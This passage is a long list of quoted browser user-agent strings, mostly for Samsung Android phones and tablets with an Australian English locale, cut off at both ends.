Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-F700U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXS3BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXS4BTG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-T827V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J260A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A307GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T585/T585XXS5CSH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G925K/KKU3ERG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.2; en-au; SAMSUNG SM-P905) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T307U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A405FN/A405FNXXS3BTI3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J330FN/J330FNXXU4CTH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G950F/G950FXXSBDUA3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXUGCTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935W8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-C7000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A310F/A310FXXS5CTK1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-T805M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T290) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G398FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS5BTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXU3BTK2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXU4BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXU9DTF1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN/A705FNXXU3ASG6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.66 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J530F/J530FXXS5BSE3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G935T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-J250F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4252.0 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A8000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-A51) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S215DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-P205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M015G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A415F/A415FXXU1ATE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A215U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A125F/A125FXXU1ATL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115AZ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A107M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A025G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015T1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T865) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T595) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M305M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G970F/G970FXXU8DTH7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A3050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A605K/KKU3CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXSBDTJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T385) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXSFCTG8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A510F/A510FXXU7CRL2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G906K/KTU1CPL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-A700FD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-T287) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A707F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A705FN/A705FNXXU5BTJ4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A305GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G970F/G970FXXU3ASJD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.99 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A750GN Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N950N Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J415FN/J415FNXXU2BSDL Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J730GM Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-N950N/KSU4CRJ2 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J720M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930VL Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G930R6 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520S Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A320Y Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-T825 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J727R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G928T Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-N915S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-G900T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 5.0.1; en-au; SAMSUNG SGH-M919V Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-J500M Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Mobile Safari/537.36', 'Mozilla/5.0 (Linux;Android 7.0; en-au; SAMSUNG SM-T830 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J720F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safa', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G960F/G960FXXU7CSJ1 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A600FN/A600FNXXU3BSD2 Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T587 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-P580 Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G615FU Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G610M Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-G390F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/7.2 Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J600FN/J600FNXXU3ASC1 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G950F/G950FXXS4CRLC Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G891A Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G570M Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-C5000 Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A910F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T385 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-T355 Build/NMF26X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965F 